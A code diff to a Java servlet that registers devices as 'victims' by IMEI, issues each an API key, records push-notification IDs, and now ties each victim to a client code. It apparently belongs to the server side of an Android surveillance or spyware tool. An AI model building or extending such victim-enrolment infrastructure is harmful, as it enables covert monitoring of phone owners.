@@ -1,5 +1,6 @@
 package com.theah64.xrob.api.servlets;
 
+import com.theah64.xrob.api.database.tables.Clients;
 import com.theah64.xrob.api.database.tables.Victims;
 import com.theah64.xrob.api.models.Victim;
 import com.theah64.xrob.api.utils.JSONUtils;
@@ -24,7 +25,7 @@ import java.util.Random;
 @WebServlet(name = "IN Servlet", urlPatterns = {BaseServlet.VERSION_CODE + "/in"})
 public class INServlet extends BaseServlet {
 
-    private static final String[] requiredParams = {Victims.COLUMN_NAME, Victims.COLUMN_IMEI};
+    private static final String[] requiredParams = {Victims.COLUMN_NAME, Clients.COLUMN_CLIENT_CODE, Victims.COLUMN_IMEI};
     private static final int API_KEY_LENGTH = 10;
 
     protected void doPost(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws ServletException, IOException {
@@ -34,6 +35,7 @@ public class INServlet extends BaseServlet {
         final PrintWriter out = servletResponse.getWriter();
 
         try {
+
             final Request request = new Request(servletRequest, requiredParams);
 
             final String imei = request.getStringParameter(Victims.COLUMN_IMEI);
@@ -54,7 +56,7 @@ public class INServlet extends BaseServlet {
                 //Preparing new api key for new victim
                 final String apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
 
-                final Victim newVictim = new Victim(name, imei, apiKey, gcmId);
+                final Victim newVictim = new Victim(name, imei, clientCode, apiKey, gcmId);
 
                 victimsTable.addv2(newVictim);
                 out.write(JSONUtils.getSuccessJSON(Victims.COLUMN_API_KEY, apiKey));
@@ -62,6 +64,7 @@ public class INServlet extends BaseServlet {
             } else {
 
                 final String gcmId = request.getStringParameter(Victims.COLUMN_GCM_ID);
+
                 if (gcmId != null && !gcmId.isEmpty() && !oldVictim.getGCMId().equals(gcmId)) {
                     //New GCM ID so update
                     victimsTable.update(Victims.COLUMN_IMEI, imei, Victims.COLUMN_GCM_ID, gcmId);
